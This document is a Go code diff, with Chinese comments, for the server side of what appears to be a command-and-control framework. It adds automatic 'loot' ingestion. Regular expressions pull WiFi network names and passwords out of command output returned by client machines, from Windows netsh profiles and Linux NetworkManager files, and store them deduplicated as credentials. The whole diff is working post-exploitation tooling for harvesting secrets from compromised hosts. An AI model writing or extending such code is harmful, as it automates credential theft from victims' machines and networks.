@@ -3,6 +3,7 @@ package api
 import (
 	"BackendTemplate/pkg/database"
 	"net/http"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -109,6 +110,13 @@ func AddLootIfNotEmpty(uid, lootType, user, realm, host, secret, note, source st
 	if !lootTypes[lootType] {
 		lootType = "note"
 	}
+	// 同一会话重复执行同一条提取命令（如 wifi 连跑两次）时避免重复入库
+	if has, _ := database.Engine.Where(
+		"uid = ? AND type = ? AND host = ? AND secret = ? AND source = ?",
+		uid, lootType, host, secret, source,
+	).Get(&database.Loot{}); has {
+		return
+	}
 	item := database.Loot{
 		Uid: uid, Type: lootType, User: user, Realm: realm, Host: host,
 		Secret: secret, Note: note, Source: source,
@@ -118,4 +126,82 @@ func AddLootIfNotEmpty(uid, lootType, user, realm, host, secret, note, source st
 		// 静默: 自动入库失败不阻断命令回包主链路
 		return
 	}
+}
+
+// ===== 命令产出自动识别（V1：WiFi 配置文件）=====
+//
+// 按客户端 wifi 命令**自己的输出标记**识别，而不是泛化解析任意 "key: value"——
+// 后者会把普通命令输出里的键值对误判成凭据。识别不到时不产生任何写入。
+var (
+	// Windows：客户端在每个配置前输出 "--- <SSID> ---"
+	wifiSectionRe = regexp.MustCompile(`(?m)^---\s*(.+?)\s*---\s*$`)
+	// Windows netsh 的密码行（中英文）
+	wifiKeyLineRe = regexp.MustCompile(`(?mi)^\s*(?:关键内容|Key Content)\s*:\s*(.*?)\s*$`)
+	// Linux NetworkManager 配置
+	nmSSIDRe = regexp.MustCompile(`(?m)^ssid\s*=\s*(.+?)\s*$`)
+	nmPSKRe  = regexp.MustCompile(`(?m)^psk\s*=\s*(.+?)\s*$`)
+)
+
+// IngestLootFromOutput 从一条命令回包中识别可入库的凭据，返回新入库条数。
+// 由 main 注入到 command.LootIngestFunc，在命令输出落到 shell 内容之后调用。
+func IngestLootFromOutput(uid, output string) int {
+	if database.Engine == nil || strings.TrimSpace(output) == "" {
+		return 0
+	}
+	return ingestWindowsWifi(uid, output) + ingestLinuxWifi(uid, output)
+}
+
+// ingestWindowsWifi 解析 "=== WiFi Profiles ===" + 每段 "--- SSID ---" 下的
+// "关键内容/Key Content : <密码>"。
+func ingestWindowsWifi(uid, output string) int {
+	if !strings.Contains(output, "=== WiFi Profiles ===") {
+		return 0
+	}
+	marks := wifiSectionRe.FindAllStringSubmatchIndex(output, -1)
+	count := 0
+	for i, m := range marks {
+		ssid := strings.TrimSpace(output[m[2]:m[3]])
+		end := len(output)
+		if i+1 < len(marks) {
+			end = marks[i+1][0]
+		}
+		section := output[m[1]:end]
+		km := wifiKeyLineRe.FindStringSubmatch(section)
+		if len(km) < 2 {
+			continue
+		}
+		pwd := strings.TrimSpace(km[1])
+		if pwd == "" {
+			continue
+		}
+		AddLootIfNotEmpty(uid, "pwd", "", "", ssid, pwd, "WiFi 配置文件", "wifi")
+		count++
+	}
+	return count
+}
+
+// ingestLinuxWifi 解析 NetworkManager 配置（cat 拼接、无块分隔符）：
+// 按行扫描，ssid 出现在 psk 之前，用最近一次 ssid 给随后的 psk 配对。
+func ingestLinuxWifi(uid, output string) int {
+	if !nmPSKRe.MatchString(output) {
+		return 0
+	}
+	lastSSID := ""
+	count := 0
+	for _, raw := range strings.Split(output, "\n") {
+		line := strings.TrimSpace(raw)
+		if m := nmSSIDRe.FindStringSubmatch(line); m != nil {
+			lastSSID = strings.TrimSpace(m[1])
+			continue
+		}
+		if m := nmPSKRe.FindStringSubmatch(line); m != nil {
+			if pwd := strings.TrimSpace(m[1]); pwd != "" {
+				AddLootIfNotEmpty(uid, "pwd", "", "", lastSSID, pwd,
+					"WiFi 配置文件（NetworkManager）", "wifi")
+				count++
+			}
+			lastSSID = ""
+		}
+	}
+	return count
 }
